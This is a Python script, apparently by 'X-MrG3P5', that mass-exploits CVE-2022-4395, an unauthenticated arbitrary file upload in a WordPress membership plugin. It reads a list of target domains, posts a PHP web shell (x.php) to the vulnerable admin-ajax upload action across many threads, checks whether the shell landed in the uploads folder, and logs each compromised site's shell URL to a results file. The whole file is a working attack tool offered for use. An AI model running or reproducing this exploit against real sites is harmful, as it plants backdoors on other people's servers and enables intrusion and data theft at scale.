import requests
import pyfiglet
import os
import re
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore, init

red = Fore.LIGHTRED_EX
cyan = Fore.LIGHTCYAN_EX
white = Fore.WHITE
green = Fore.LIGHTGREEN_EX

init(autoreset=True)
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def banner():
    os.system("cls||clear")
    my_banner = pyfiglet.figlet_format("WP - EXPLOIT", font="slant", justify="left")
    print(f"{red}{my_banner}")
    print(f"           {cyan}\t\t[ {white}Created By X-MrG3P5 {cyan}]\n")
    print(f"            \t   {white}Mass Auto Exploit CVE-2022-4395 \n\t        Unauthenticated Arbitrary File Upload\n")

def Exploit(domain):
    try:
        url = "http://" + domain + "/wp-admin/admin-ajax.php?action=wps_membership_csv_file_upload"
        shell = open("x.php", "rb")
        datas = {
            'file': shell,
            'type': 'text/csv'
        }
        head = {
            "content-type": "multipart/form-data"
        }

        requests.post(url, data=datas, headers=head, verify=False).text
        check_url = "http://" + domain + "/wp-content/uploads/mfw-activity-logger/csv-uploads/x.php"
        check = requests.get(check_url, verify=False).text
        if "X-MrG3P5" in check:
            open("result.txt", "a").write(check_url + "\n")
            print(f"{white}--> {domain} | {green}Success{white}")
        else:
            print(f"{white}--> {domain} | {red}Failed{white}")
    except:
        print(f"{white}--> {domain} | {red}Failed{white}")

def Run():
    banner()
    input_list = open(input(f"{cyan}[{white}?{cyan}] {white}Give Me List : ")).read().replace("http://", "").replace("https://", "")
    domain_fixer = re.findall(r'(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}', input_list)
    Thread = input(f"{cyan}[{white}?{cyan}] {white}Thread : ")
    pool = ThreadPool(int(Thread))
    pool.map(Exploit, domain_fixer)
    pool.close()
    pool.join()

if __name__=="__main__":
    Run()
